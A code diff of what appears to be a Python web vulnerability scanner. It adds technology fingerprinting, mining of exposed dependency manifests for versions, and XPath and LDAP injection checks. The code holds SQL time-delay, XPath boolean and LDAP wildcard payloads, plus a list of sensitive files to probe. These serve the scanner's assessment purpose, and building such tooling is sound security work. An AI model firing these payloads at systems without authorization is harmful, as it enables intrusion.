@@ -19,12 +19,23 @@ import json
 import re
 import secrets as pysecrets
 import time
-from urllib.parse import quote, urlparse
+from urllib.parse import parse_qsl, quote, urlencode, urlparse
 
 from netclient import Client, similarity
 import netclient
 import crawler as crawl_mod
-from scanners import COMMON_PORTS, tcp_scan, tcp_scan_detailed, ssl_audit, resolve_host
+import wafscore
+import xssverify
+import timingoracle
+import diffconfirm
+from scanners import (COMMON_PORTS, tcp_scan, tcp_scan_detailed,
+                      ssl_audit, resolve_host, org_domain)
+from secretpatterns import (WEB_TIER_A_PATTERNS, WEB_GENERIC_SECRET_RE,
+                            DETECTORS_V2, AWS_SECRET_RE,
+                            github_token_structurally_valid, parse_jwt,
+                            luhn_valid, bip39_phrase_status,
+                            is_denied_secret, shannon_entropy,
+                            _mask as _secret_mask)
 
 SEV_ORDER = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "INFO": 0}
 
@@ -40,6 +51,18 @@ SQL_ERRORS = [
 SQL_TIME_PAYLOADS = ["1' AND SLEEP(3)-- -", "1 AND SLEEP(3)",
                      "1'; SELECT pg_sleep(3)-- -", "1' WAITFOR DELAY '0:0:3'-- -",
                      "1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',3)"]
+
+
+def _zero_delay(payload):
+    """Zero-delay twin of a time payload (WS1 v1.7.0): the same syntax
+    with the delay set to 0, for the timing oracle's triple-step
+    confirmation. Returns the payload unchanged when no known delay
+    construct is present (the caller then skips that family)."""
+    p = re.sub(r"(?i)sleep\(\s*3\s*\)", "sleep(0)", payload)
+    p = p.replace("'0:0:3'", "'0:0:0'")
+    p = re.sub(r"(?i)(receive_message\('[^']*',\s*)3(\s*\))",
+               r"\g<1>0\g<2>", p)
+    return p
 
 
 def F(sev, title, desc, evidence="", cwe="", owasp="", cvss=0.0, remed="",
@@ -68,6 +91,57 @@ class Ctx:
         self._soft404 = None
         self.technologies = []
         self.opts = opts
+        # ---- WS1 (v1.4.0): canary/OAST state. scan_id correlates every
+        # token this scan plants in the (possibly shared) registry.
+        self.scan_id = str(opts.get("scan_id") or f"scan-{self.marker}")
+        _can = opts.get("canary") or {}
+        self.canary_configured = bool(_can.get("registry") and _can.get("base"))
+        if not self.canary_configured:
+            self.canary_base_kind = "none"
+        elif _can.get("base_kind") in ("external", "builtin"):
+            self.canary_base_kind = _can["base_kind"]
+        else:
+            _b = str(_can.get("base") or "")
+            self.canary_base_kind = ("builtin" if ("127.0.0.1" in _b
+                                                   or "localhost" in _b)
+                                     else "external")
+        try:
+            self.canary_grace_s = max(0.0, float(opts.get("canary_grace_s", 60)))
+        except Exception:
+            self.canary_grace_s = 60.0
+        self._oob_planted = []        # entry dicts (see _oob_issue)
+        self._oob_reported = set()   # tokens already turned into findings
+        self._oob_last_plant_ts = 0.0
+        self._xss_marks = None        # WS2 marker sandwich (lazy)
+        # v1.8.0: structured per-check metadata that is not a finding
+        # (BFLA matrix rows, AXFR/bucket/OAuth evaluation summaries,
+        # leftover upload artifacts) — surfaced in the scan result.
+        self.check_meta = {}
+
+    def xss_marks(self):
+        """WS2 marker sandwich for this scan (lazy, stable per scan)."""
+        if self._xss_marks is None:
+            self._xss_marks = xssverify.make_sandwich(self.marker)
+        return self._xss_marks
+
+    def canary_status(self, note=""):
+        """Honest OAST status for the scan result meta (WS1): whether a
+        canary was configured at all, what kind of base, how many tokens
+        this scan planted and how many callbacks actually arrived."""
+        st = {"configured": self.canary_configured,
+              "base_kind": self.canary_base_kind,
+              "tokens_planted": len(self._oob_planted),
+              "callbacks_received": 0, "tokens_hit": 0,
+              "grace_window_s": self.canary_grace_s, "note": note}
+        if self.canary_configured:
+            reg = (self.opts.get("canary") or {}).get("registry")
+            try:
+                s = reg.stats(self.scan_id)
+                st["callbacks_received"] = s["callbacks_received"]
+                st["tokens_hit"] = s["tokens_hit"]
+            except Exception:
+                pass
+        return st
 
     def L(self, msg):
         if self.log is not None:
@@ -321,6 +395,115 @@ def _tech_fingerprint(ctx):
             if ev not in cur.get("evidence_list", []):
                 cur.setdefault("evidence_list", []).append(ev)
         ctx.L(f"  [tech-probe] {pname} {pver} CONFIRMED via {path}")
+    # WS4 escalation probe (v1.7.0): ONE extra fetch — /favicon.ico —
+    # whose MD5 is checked against techdb.FAVICON_MD5 (known product
+    # hashes). A match is an independent artifact: it corroborates an
+    # existing detection or introduces the technology before relations
+    # and scoring run. (The characteristic-error-page leg of the
+    # escalation already exists: error_body mining in techdb.profile
+    # at the 0.85 'error' source score.)
+    try:
+        _fr = ctx.client.get("/favicon.ico")
+        if _fr.status == 200 and getattr(_fr, "raw", b""):
+            _md5 = hashlib.md5(_fr.raw).hexdigest()
+            _fname = techdb.FAVICON_MD5.get(_md5)
+            if _fname:
+                _cur = next((t for t in techs if t["name"] == _fname),
+                            None)
+                if _cur is None:
+                    techs.append({
+                        "name": _fname,
+                        "category": techdb._CAT_BY_NAME.get(_fname, ""),
+                        "version": "",
+                        "evidence": f"favicon MD5 {_md5} matches known "
+                                    f"{_fname} favicon",
+                        "source": "favicon",
+                        "evidence_list": [f"favicon MD5 {_md5}"],
+                        "sources": ["favicon"],
+                        "detail": techdb.DETAILS.get(_fname, ""),
+                        "confidence": "probable",
+                        "version_confidence": ""})
+                else:
+                    if "favicon" not in (_cur.get("sources") or []):
+                        _cur.setdefault("sources", []).append("favicon")
+                        _cur.setdefault("evidence_list", []).append(
+                            f"favicon MD5 {_md5} matches")
+                ctx.L(f"  [tech-escalation] favicon MD5 {_md5} -> {_fname}")
+    except Exception:
+        pass
+    # WS3 (v1.10.0, K4): Next.js buildId dicatat sebagai IDENTIFIER
+    # build — TIDAK PERNAH sebagai versi (versi Next.js hanya dari
+    # manifest dependensi yang tervalidasi, WS2).
+    for t in techs:
+        if t["name"] == "Next.js":
+            mb = re.search(r'"buildId"\s*:\s*"([^"\s]{1,64})"',
+                           body or "")
+            if mb:
+                t["build_id"] = mb.group(1)
+                note = (f"Next.js buildId {mb.group(1)} (build "
+                        "identifier — not a version)")
+                if note not in t["evidence_list"]:
+                    t["evidence_list"].append(note)
+            break
+
+    # WS6 (v1.10.0): bukti EKOSISTEM dari ekstensi URL di permukaan
+    # crawl — hanya menamai ekosistem, TIDAK PERNAH menghasilkan versi.
+    _EXT_ECO = ((".jsp", "Java (Servlet)", "Runtime"),
+                (".action", "Apache Struts", "Framework"),
+                (".do", "Java (Servlet)", "Runtime"),
+                (".aspx", "ASP.NET", "Runtime"),
+                (".php", "PHP", "Runtime"),
+                (".cfm", "Adobe ColdFusion", "Runtime"))
+    try:
+        _surf = ctx.surface(full=False)
+        _urls = list(_surf.pages) + list(_surf.param_urls) \
+            + list(_surf.js_endpoints)
+        _urls += re.findall(r'(?:href|src)\s*=\s*"([^"]+)"',
+                            body or "", re.I)
+        _seen_ext = set(t["name"] for t in techs)
+        for u in _urls:
+            pth = (u or "").split("?")[0].split("#")[0].lower()
+            for ext, nm, catg in _EXT_ECO:
+                if pth.endswith(ext) and nm not in _seen_ext:
+                    _seen_ext.add(nm)
+                    techs.append({
+                        "name": nm, "category": catg, "version": "",
+                        "evidence": f"URL extension {ext} in crawled "
+                                    f"link: {u[:120]}",
+                        "source": "crawl",
+                        "evidence_list": [f"URL extension {ext} in "
+                                          f"crawled link: {u[:120]}"],
+                        "sources": ["crawl"],
+                        "detail": techdb.DETAILS.get(nm, "")})
+                    break
+    except Exception:
+        pass
+
+    # WS4 (v1.7.0): implies/excludes relations — a vetoed detection is
+    # capped at candidate and can never be named probable+; its score
+    # is still computed and shown in evidence.
+    techdb.apply_relations(techs)
+    # WS3/K4 (v1.4.0): the same scored-claim model as WAF fingerprinting
+    # applies to technology detections — a claim carried by a SINGLE
+    # artifact gets the base score of its strongest source; independent
+    # corroborating sources add +0.10 each (cap 0.95); an actively
+    # verified component scores 0.98. The score + its signals travel
+    # into the finding evidence so single-sign claims stay auditable
+    # (a bare product name in body text = source 'html' at 0.55, never
+    # dressed up as more than it is).
+    _SRC_SCORE = {"error": 0.85, "header": 0.80, "script": 0.75,
+                  "cookie": 0.70, "html": 0.55, "probe": 0.95,
+                  "favicon": 0.80, "implied": 0.40, "crawl": 0.45}
+    for t in techs:
+        _srcs = list(dict.fromkeys(t.get("sources")
+                                   or [t.get("source", "html")]))
+        _score = max((_SRC_SCORE.get(s, 0.50) for s in _srcs),
+                     default=0.50)
+        if len(_srcs) > 1:
+            _score = min(0.95, _score + 0.10 * (len(_srcs) - 1))
+        if t.get("verified"):
+            _score = 0.98
+        t["score"] = round(_score, 2)
     ctx.technologies = techs
     for t in techs:
         ctx.L(f"  [tech] {t['name']} {t.get('version', '')} ({t.get('category', '')})".rstrip())
@@ -330,15 +513,26 @@ def _tech_fingerprint(ctx):
 def c_tech_fingerprint(ctx, add):
     techs = _tech_fingerprint(ctx)
     for t in techs:
+        if t.get("vetoed_by"):
+            # WS4: a vetoed technology is never named in its own
+            # finding; it remains visible in the aggregate profile
+            # below, with its score and the veto reason in evidence.
+            continue
         if t.get("version"):
+            _sigs = "; ".join(t.get("evidence_list") or [t["evidence"]])
             add(F("INFO", f"Technology detected: {t['name']} {t['version']}",
                   'Passive fingerprint from headers/HTML. Exact versions make it easier for an attacker to map relevant CVEs — CVE candidates (if any) are reported separately as candidates, not confirmed.',
-                  evidence=t["evidence"], cwe="CWE-200", owasp="A05:2021", cvss=0.0,
+                  evidence=(f"{t['evidence']} | fingerprint score "
+                            f"{t.get('score', 0):.2f} (signals: {_sigs})"),
+                  cwe="CWE-200", owasp="A05:2021", cvss=0.0,
                   remed='Hide the version where possible; ensure this version is patched.',
                   confidence="confirmed", location="/"))
     if techs:
         ringkas = "; ".join(
             f"{t['name']}{' ' + t['version'] if t.get('version') else ''} [{t.get('category', '')}]"
+            + (f" (vetoed by {t['vetoed_by']} — candidate, score "
+               f"{t.get('score', 0):.2f})" if t.get('vetoed_by') else "")
+            + (" (implied)" if t.get('implied_by') else "")
             for t in techs)
         add(F("INFO", f"Technology & integration profile: {len(techs)} detected",
               'The stack and third-party services installed/integrated in this application, identified from response artifacts (headers, cookies, HTML, scripts) with per-item evidence in the scan result (tech_profile). Every integration is attack surface and supply chain that must be inventoried.',
@@ -642,6 +836,21 @@ SENSITIVE_FILES = {
                          [r"(?m)^(spring|server|datasource)\s*:"]),
     "/.npmrc": ("HIGH", "CWE-200", 7.5, 'npm registry token potentially leaked — rotate it.',
                 [r"_authToken|registry\s*="]),
+    # --- manifest dependensi tambahan (v1.10.0 WS2): file yang sama juga
+    # ditambang isinya menjadi versi framework oleh c_dependency_versions
+    # (hanya sesudah lolos verifikasi signature + validasi struktur).
+    "/Gemfile.lock": ("LOW", "CWE-200", 5.3, 'Discloses the exact gem dependency versions.',
+                      [r"(?m)^GEM\s*$", r"(?m)^\s+specs:"]),
+    "/requirements.txt": ("LOW", "CWE-200", 5.3, 'Discloses Python dependency pins.',
+                          [r"(?m)^[A-Za-z0-9_.\-]+==[^\s;]+"]),
+    "/Pipfile.lock": ("LOW", "CWE-200", 5.3, 'Discloses the exact Python dependency versions.',
+                      [r'"_meta"', r'"default"\s*:']),
+    "/pom.xml": ("LOW", "CWE-200", 5.3, 'Discloses the Maven project model and dependency versions.',
+                 [r"<project", r"<modelVersion>"]),
+    "/build.gradle": ("LOW", "CWE-200", 5.3, 'Discloses the Gradle build and dependency versions.',
+                      [r"(?m)^\s*(plugins|buildscript)\s*\{", r"apply\s+plugin:"]),
+    "/packages.config": ("LOW", "CWE-200", 5.3, 'Discloses the exact NuGet package versions.',
+                         [r"<packages>", r"<package\s+id="]),
 }
 
 
@@ -663,12 +872,288 @@ def c_sensitive_files(ctx, add):
             continue
         if not sigs and len(r.body) < 1024:
             continue  # heapdump asli besar; respons kecil tanpa signature = tidak meyakinkan
+        if path in SECRET_FEED_PATHS:
+            # Secrets Engine v2 (B3.3): the verified body is fed to the
+            # secrets engine by c_exposed_secrets later in the profile.
+            feed = getattr(ctx, "_secret_feed", None)
+            if feed is None:
+                feed = ctx._secret_feed = []
+            feed.append((path, r.body[:262144]))
+        if path in DEP_FEED_PATHS:
+            # WS2 (v1.10.0): the SAME verified body (it already passed
+            # the signature gate + soft-404 guard above) is fed to the
+            # dependency-manifest miner in c_dependency_versions —
+            # zero extra fetches; the miner re-validates structure
+            # strictly before any version is claimed.
+            dfeed = getattr(ctx, "_dep_feed", None)
+            if dfeed is None:
+                dfeed = ctx._dep_feed = []
+            dfeed.append((path, r.body[:4000000]))
         add(F(sev, f"Sensitive file exposed: {path}",
               f"The endpoint responded 200 and the content PASSED signature verification ({matched or 'size+baseline'}), not just a 200 status. {remed}",
               evidence=f"HTTP 200, {len(r.body)} bytes, signature: {matched or '-'}",
               cwe=cwe, owasp="A05:2021 Security Misconfiguration", cvss=cvss,
               remed=remed, confidence="confirmed" if matched else "probable",
               location=path))
+
+
+# ------------------------------------------------- WS2 (v1.10.0): tambang
+# isi manifest dependensi yang SUDAH terkonfirmasi bocor oleh
+# c_sensitive_files menjadi versi framework di tech_profile.
+# Aturan bukti keras:
+# - Isi wajib lolos validasi struktur per format (parse JSON/lockfile
+#   valid + skema kunci cocok). Respons catch-all/SPA (HTML 200 untuk
+#   semua path) gugur di gerbang c_sensitive_files (signature +
+#   soft-404) DAN di validasi struktur di sini — dua lapis.
+# - Hanya versi EKSAK yang ditambang: rentang semver di file deklarasi
+#   (package.json/composer.json: "^4.18.2", "~10.0") BUKAN versi dan
+#   tidak pernah diklaim. Lockfile memuat versi ter-resolve = eksak.
+# - K3: hanya framework/runtime yang dikenal di katalog bawah — bukan
+#   semua dependensi.
+_DEP_EXACT = re.compile(r"^v?(\d+\.\d+\.\d+(?:[-+][0-9A-Za-z.\-]+)?)$")
+
+_DEP_NPM = {"express": "Express (Node.js)", "next": "Next.js",
+            "nuxt": "Nuxt", "nuxt3": "Nuxt", "@nestjs/core": "NestJS",
+            "koa": "Koa", "fastify": "Fastify", "react": "React",
+            "react-dom": "React", "vue": "Vue.js",
+            "@angular/core": "Angular", "jquery": "jQuery"}
+_DEP_COMPOSER = {"laravel/framework": "Laravel",
+                 "symfony/framework-bundle": "Symfony",
+                 "symfony/symfony": "Symfony",
+                 "codeigniter4/framework": "CodeIgniter",
+                 "codeigniter/framework": "CodeIgniter",
+                 "cakephp/cakephp": "CakePHP", "yiisoft/yii2": "Yii",
+                 "drupal/core": "Drupal",
+                 "johnpbloch/wordpress": "WordPress",
+                 "roots/wordpress": "WordPress"}
+_DEP_PY = {"django": "Django", "flask": "Flask", "fastapi": "FastAPI"}
+_DEP_GEM = {"rails": "Ruby on Rails"}
+_DEP_NUGET = {"microsoft.aspnet.mvc": "ASP.NET MVC"}
+
+
+def _dep_norm(raw):
+    """Normalisasi versi eksak dari manifest; None bila bukan versi
+    eksak (rentang/operator/placeholder tidak pernah diklaim)."""
+    if not isinstance(raw, str):
+        return None
+    m = _DEP_EXACT.match(raw.strip())
+    return m.group(1) if m else None
+
+
+def _dep_json(body):
+    try:
+        d = json.loads(body or "")
+    except Exception:
+        return None
+    return d if isinstance(d, dict) else None
+
+
+def _mine_manifest(path, body):
+    """Parse satu manifest terverifikasi -> list (nama_teknologi,
+    versi, id_paket). Mengembalikan [] untuk isi yang tidak lolos
+    validasi struktur — tanpa klaim apa pun."""
+    out = []
+    if not body or len(body) < 8:
+        return out
+    if path == "/package-lock.json":
+        d = _dep_json(body)
+        if not d or "lockfileVersion" not in d:
+            return out
+        pkgs = d.get("packages")
+        if isinstance(pkgs, dict):
+            for key, ent in pkgs.items():
+                if not key.startswith("node_modules/") \
+                        or not isinstance(ent, dict):
+                    continue
+                pkg = key[len("node_modules/"):]
+                pkg = pkg.split("/node_modules/")[-1]
+                name = _DEP_NPM.get(pkg)
+                ver = _dep_norm(ent.get("version"))
+                if name and ver:
+                    out.append((name, ver, pkg))
+        deps = d.get("dependencies")
+        if isinstance(deps, dict):
+            for pkg, ent in deps.items():
+                name = _DEP_NPM.get(pkg)
+                ver = _dep_norm((ent or {}).get("version")) \
+                    if isinstance(ent, dict) else None
+                if name and ver:
+                    out.append((name, ver, pkg))
+    elif path == "/package.json":
+        d = _dep_json(body)
+        if not d:
+            return out
+        for sect in ("dependencies", "devDependencies"):
+            deps = d.get(sect)
+            if not isinstance(deps, dict):
+                continue
+            for pkg, raw in deps.items():
+                name = _DEP_NPM.get(pkg)
+                ver = _dep_norm(raw)  # rentang ^/~ gugur di sini
+                if name and ver:
+                    out.append((name, ver, pkg))
+    elif path == "/composer.lock":
+        d = _dep_json(body)
+        if not d or not isinstance(d.get("packages"), list):
+            return out
+        for ent in d["packages"]:
+            if not isinstance(ent, dict):
+                continue
+            name = _DEP_COMPOSER.get(str(ent.get("name") or "").lower())
+            ver = _dep_norm(ent.get("version"))
+            if name and ver:
+                out.append((name, ver, str(ent.get("name"))))
+    elif path == "/composer.json":
+        d = _dep_json(body)
+        if not d or not isinstance(d.get("require"), dict):
+            return out
+        for pkg, raw in d["require"].items():
+            name = _DEP_COMPOSER.get(str(pkg).lower())
+            ver = _dep_norm(raw)
+            if name and ver:
+                out.append((name, ver, str(pkg)))
+    elif path == "/Gemfile.lock":
+        if "GEM" not in body or "specs:" not in body:
+            return out
+        for m in re.finditer(r"(?m)^    ([a-z0-9_.\-]+) \(([\d][^)]*)\)",
+                             body):
+            name = _DEP_GEM.get(m.group(1).lower())
+            ver = _dep_norm(m.group(2))
+            if name and ver:
+                out.append((name, ver, m.group(1)))
+    elif path == "/requirements.txt":
+        if body.lstrip().startswith("<"):
+            return out  # halaman HTML (catch-all), bukan manifest
+        for m in re.finditer(r"(?mi)^\s*([A-Za-z0-9_.\-]+)==([^\s;#]+)",
+                             body):
+            name = _DEP_PY.get(m.group(1).lower())
+            ver = _dep_norm(m.group(2))
+            if name and ver:
+                out.append((name, ver, m.group(1)))
+    elif path == "/Pipfile.lock":
+        d = _dep_json(body)
+        if not d or not isinstance(d.get("default"), dict):
+            return out
+        for pkg, ent in d["default"].items():
+            if not isinstance(ent, dict):
+                continue
+            raw = str(ent.get("version") or "")
+            name = _DEP_PY.get(str(pkg).lower())
+            ver = _dep_norm(raw[2:] if raw.startswith("==") else raw)
+            if name and ver:
+                out.append((name, ver, str(pkg)))
+    elif path == "/pom.xml":
+        if "<project" not in body or "spring-boot-starter-parent" \
+                not in body:
+            return out
+        m = re.search(r"<parent>.*?<artifactId>\s*spring-boot-starter-"
+                      r"parent\s*</artifactId>\s*<version>\s*([\d.]+)"
+                      r"\s*</version>", body, re.S)
+        if m:
+            out.append(("Spring Boot", m.group(1),
+                        "spring-boot-starter-parent"))
+    elif path == "/build.gradle":
+        m = re.search(r"id\s+['\"]org\.springframework\.boot['\"]\s+"
+                      r"version\s+['\"]([\d.]+)['\"]", body)
+        if not m:
+            m = re.search(r"['\"]org\.springframework\.boot:[^'\"]*?:"
+                          r"([\d.]+)['\"]", body)
+        if m:
+            out.append(("Spring Boot", m.group(1),
+                        "org.springframework.boot"))
+    elif path == "/packages.config":
+        if "<packages>" not in body:
+            return out
+        for m in re.finditer(r"<package\s+([^>]+)>", body):
+            attrs = dict(re.findall(r'(\w+)\s*=\s*"([^"]*)"',
+                                    m.group(1)))
+            name = _DEP_NUGET.get((attrs.get("id") or "").lower())
+            ver = _dep_norm(attrs.get("version"))
+            if name and ver:
+                out.append((name, ver, attrs.get("id")))
+    # dedup per (nama, versi) — entri pertama menang
+    seen, uniq = set(), []
+    for name, ver, pkg in out:
+        if (name, ver) not in seen:
+            seen.add((name, ver))
+            uniq.append((name, ver, pkg))
+    return uniq
+
+
+def _merge_dep_tech(techs, name, ver, pkg, path):
+    """Gabungkan satu versi hasil tambang manifest ke tech_profile.
+    Entri yang sudah ada: versi diisi + evidence/sumber 'depfile'
+    ditambah, keyakinan dihitung ulang dengan semantik profil yang
+    sama (verified > >=2 sumber = confirmed > probable). Entri baru:
+    probable — satu artefak (file milik aplikasi sendiri), skor 0.90."""
+    import techdb as _tdb
+    ev = f"exposed dependency file {path}: {pkg} {ver}"
+    cur = next((t for t in techs if t["name"] == name), None)
+    if cur is None:
+        techs.append({"name": name,
+                      "category": _tdb._CAT_BY_NAME.get(name, "Framework"),
+                      "version": ver, "evidence": ev, "source": "depfile",
+                      "evidence_list": [ev], "sources": ["depfile"],
+                      "detail": _tdb.DETAILS.get(name, ""),
+                      "confidence": "probable",
+                      "version_confidence": "probable", "score": 0.90})
+        return True
+    if "depfile" not in (cur.get("sources") or []):
+        cur.setdefault("sources", []).append("depfile")
+    if ev not in (cur.get("evidence_list") or []):
+        cur.setdefault("evidence_list", []).append(ev)
+    changed = False
+    if ver and not cur.get("version"):
+        cur["version"] = ver
+        changed = True
+    srcs = set(cur.get("sources") or [])
+    if cur.get("verified"):
+        cur["confidence"] = "verified"
+    elif len(srcs) >= 2:
+        cur["confidence"] = "confirmed"
+    else:
+        cur["confidence"] = "probable"
+    if cur.get("version"):
+        cur["version_confidence"] = cur["confidence"]
+    cur["score"] = max(cur.get("score") or 0.0, 0.90) \
+        if not cur.get("verified") else 0.98
+    return changed
+
+
+def c_dependency_versions(ctx, add):
+    """WS2 (v1.10.0): versi framework dari isi manifest dependensi
+    yang terkonfirmasi bocor. Berjalan sesudah c_sensitive_files
+    (feed-nya) dan sebelum c_cve_candidates (agar versi hasil tambang
+    ikut dicocokkan CVE-nya di profil deep/enterprise)."""
+    feed = getattr(ctx, "_dep_feed", None) or []
+    if not feed:
+        return
+    techs = _tech_fingerprint(ctx)
+    mined = []
+    for path, body in feed:
+        for name, ver, pkg in _mine_manifest(path, body):
+            _merge_dep_tech(techs, name, ver, pkg, path)
+            mined.append((name, ver, path))
+            ctx.L(f"  [depfile] {path}: {pkg} -> {name} {ver}")
+    if mined:
+        ringkas = "; ".join(f"{n} {v} (from {p})" for n, v, p in mined)
+        add(F("INFO", "Framework version(s) from exposed dependency "
+                      f"manifest: {len(mined)} identified",
+              "The application's own dependency manifest — already "
+              "confirmed exposed by the sensitive-files check and "
+              "structurally validated before mining — pins these "
+              "exact framework versions. The versions are read from "
+              "the file itself (never inferred from a product name); "
+              "whether the running deployment uses exactly this "
+              "manifest is rated probable. CVE candidates for these "
+              "versions are reported separately as candidates.",
+              evidence=ringkas[:600], cwe="CWE-200", owasp="A05:2021",
+              cvss=0.0,
+              remed="Remove dependency manifests (lockfiles, "
+                    "package.json, pom.xml) from the web root; they "
+                    "hand attackers an exact version inventory.",
+              confidence="probable",
+              location=mined[0][2]))
 
 
 def c_directory_listing(ctx, add):
@@ -1022,12 +1507,182 @@ def _sql_error_in(body, baseline_body=""):
     return [e for e in SQL_ERRORS if e in low and e not in blow]
 
 
+# XPath/XQuery error signatures (Priority 1). The bare word "xpath" is
+# deliberately NOT a signature: it appears in legitimate documentation
+# text everywhere (the "f5" WAF false-positive lesson). Only exception
+# class names, standard XQuery error codes, and error phrases qualify.
+XPATH_ERRORS = [
+    "javax.xml.xpath", "xpathsyntaxerror", "xpath exception",
+    "system.xml.xpath", "xpathnavigator", "xpathexpression",
+    "xmlxpathcomp", "xpath_eval", "xpathevalerror",
+    "xpty0004", "xpst0003", "xpst0017",
+    "saxon-api", "net.sf.saxon", "lxml.etree.xpath",
+    "invalid expression", "unterminated quote in expression",
+]
+
+
+def _xpath_error_in(body, baseline_body=""):
+    low = (body or "").lower()
+    blow = (baseline_body or "").lower()
+    return [e for e in XPATH_ERRORS if e in low and e not in blow]
+
+
+LDAP_ERRORS = ["ldap_search", "ldap_bind", "invalid dn syntax",
+               "javax.naming", "ldap: error code", "ldapexception",
+               "ldap exception", "bad search filter", "invalid filter",
+               "no such object", "operations error"]
+
+_LDAP_HINT = re.compile(
+    r"ldap|directory|uid|user|login|account|search|dir|cn", re.I)
+
+
+def _ldap_differential(ctx, R, baseline_body, unrefl):
+    """WS1 (v1.8.0): boolean differential for LDAP filter contexts,
+    judged by the v1.7.0 diffconfirm oracle. The template is the
+    WILDCARD page (the full result set); the FALSE-prime is an
+    impossible value (the empty result). Verdicts:
+
+      "full"    — a fresh wildcard shot reads True while a second
+                  impossible value, a junk control and the plain
+                  baseline value all read False: the value is
+                  interpreted as filter syntax, not as a literal.
+      "partial" — the wildcard/impossible contrast holds but one
+                  control is ambiguous.
+      "indeterminate" / "none" — no claim is made.
+
+    The Arithmetic Proof Battery deliberately does NOT apply here:
+    LDAP filters have no arithmetic conditions to prove. This is a
+    documented exception, the same treatment the XPath boolean path
+    received in v1.7.0 — the verdict rests on the differential plus,
+    for the confirmed tier, independent directory-error evidence."""
+    imp_a = f"ptknomatch{ctx.marker}a"
+    imp_b = f"ptknomatch{ctx.marker}b"
+    junk = f"ptkjunk{ctx.marker}ldap"
+    w1 = R("*")
+    w2 = R("*")
+    if not w1.status or not w2.status or not w1.body:
+        return "indeterminate", "wildcard probe did not answer"
+    if any(s in w1.body.lower() for s in LDAP_ERRORS):
+        return "indeterminate", \
+            "the wildcard value itself triggers an LDAP error page"
+    e1 = R(imp_a)
+    if not e1.status:
+        return "indeterminate", "impossible-value probe did not answer"
+    oracle = diffconfirm.DifferentialOracle(
+        unrefl(w1.body, "*"), unrefl(w2.body or "", "*"),
+        unrefl(e1.body or "", imp_a), error_signatures=LDAP_ERRORS)
+
+    def read(v):
+        r = R(v)
+        if r is None or not r.status:
+            return None
+        return oracle.read(unrefl(r.body or "", v), r.status)
+
+    w_read = read("*")
+    i_read = read(imp_b)
+    j_read = read(junk)
+    b_read = oracle.read(baseline_body)
+    detail = (f"wildcard read={w_read}, impossible read={i_read}, "
+              f"junk read={j_read}, baseline read={b_read}, "
+              f"matchRatio learned {oracle.match_ratio:.3f}")
+    if w_read is True and i_read is False and j_read is False \
+            and b_read is False:
+        return "full", detail
+    if w_read is True and i_read is False and \
+            (j_read is False or b_read is False):
+        return "partial", detail
+    if w_read is None or i_read is None:
+        return "indeterminate", detail
+    return "none", detail
+
+
 def c_web_injection(ctx, add):
     """Suite injeksi terverifikasi: SQLi (error/boolean/time), XSS, SSTI, LFI, CMDi.
     Setiap teknik berhenti per-parameter begitu terkonfirmasi, tetapi parameter &
     teknik lain TETAP diuji (perbaikan dari v2 yang return di temuan pertama)."""
-    targets = ctx.param_targets(limit=30)
+    def _xpath_probe(base, pname, R, bbody, loc, stable, sqli_struct,
+                     _is_json):
+        """XPath section (Priority 1) for one parameter: error-based
+        = probable; boolean-based = confirmed only when BOTH
+        independent pairs pass. No blind extraction, no OOB."""
+        # ---------- XPath injection (Priority 1: error-based = probable,
+        # boolean-based = confirmed only when BOTH independent pairs pass.
+        # No blind extraction, no OOB. Skipped when SQL is already proven
+        # STRUCTURALLY on this parameter (error/UNION/boolean) — one query
+        # language proven is enough, and a second differential claim on
+        # the same behavior would be cross-technique noise. A time-based
+        # SQLi hit alone does NOT close this gate: a generic sleep proves
+        # delay, not the query language. JSON contexts are skipped
+        # entirely: escaped reflection there defeats differential tests.)
+        if not sqli_struct and not _is_json:
+            xpath_hit = False
+            for payload in ["'", "x' or 1=1 or 'x'='y"]:
+                if ctx.cancelled():
+                    return
+                r = R(payload)
+                errs = _xpath_error_in(_unrefl(r.body, payload), bbody)
+                if errs:
+                    add(F("HIGH", f"XPath Injection (error indication): {base} param '{pname}'",
+                          'The XPath payload triggered an XPath/XQuery error message from the backend that does not appear in the baseline.',
+                          evidence=f"payload={payload!r} -> error: {errs[0]}",
+                          cwe="CWE-643", owasp="A03:2021 Injection", cvss=8.1,
+                          remed='Do not build XPath expressions by string concatenation; use precompiled XPath expressions with typed variables (e.g. XPathVariableResolver or equivalent in your stack) and validate input against an allowlist.',
+                          confidence="probable", location=loc, param=pname))
+                    xpath_hit = True
+                    break
+            if not xpath_hit and stable:
+                _xpath_pairs = [("x' or '1'='1", "x' or '1'='2"),
+                                ("' or count(/*)>0 or '", "' or count(/*)=0 or '")]
+                _xpath_passed = 0
+                for _tp, _fp in _xpath_pairs:
+                    if ctx.cancelled():
+                        return
+                    _rt, _rf = R(_tp), R(_fp)
+                    if _xpath_error_in(_rt.body, bbody) or _xpath_error_in(_rf.body, bbody):
+                        continue
+                    _tb = _unrefl(_rt.body, _tp)
+                    _fb = _unrefl(_rf.body, _fp)
+                    _sim_tf = similarity(_tb, _fb)
+                    if _sim_tf < 0.75 and len(_tb) > len(_fb) * 1.2:
+                        _rt2 = R(_tp)
+                        if similarity(_unrefl(_rt2.body, _tp), _tb) > 0.90:
+                            _xpath_passed += 1
+                            ctx.L(f"  [injection] {base}?{pname}: XPath boolean T/F sim={_sim_tf:.2f} len {len(_tb)}/{len(_fb)}")
+                if _xpath_passed == 2:
+                    add(F("HIGH", f"XPath Injection (boolean-based): {base} param '{pname}'",
+                          'Both independent XPath boolean pairs behaved as a manipulated query: the TRUE condition reproducibly returned substantially more content than the FALSE condition, with no error signature involved.',
+                          evidence="2/2 boolean pairs passed (sim(T,F)<0.75, len(T)>1.2x len(F), T reproducible)",
+                          cwe="CWE-643", owasp="A03:2021 Injection", cvss=8.6,
+                          remed='Do not build XPath expressions by string concatenation; use precompiled XPath expressions with typed variables (e.g. XPathVariableResolver or equivalent in your stack) and validate input against an allowlist.',
+                          confidence="confirmed", location=loc, param=pname))
+                elif _xpath_passed == 1:
+                    add(F("HIGH", f"XPath Injection (boolean indication): {base} param '{pname}'",
+                          'One XPath boolean pair behaved as a manipulated query (TRUE reproducibly returned substantially more than FALSE) but the second independent pair did not — manual validation is required.',
+                          evidence="1/2 boolean pairs passed (sim(T,F)<0.75, len(T)>1.2x len(F), T reproducible)",
+                          cwe="CWE-643", owasp="A03:2021 Injection", cvss=8.1,
+                          remed='Do not build XPath expressions by string concatenation; use precompiled XPath expressions with typed variables (e.g. XPathVariableResolver or equivalent in your stack) and validate input against an allowlist.',
+                          confidence="probable", location=loc, param=pname))
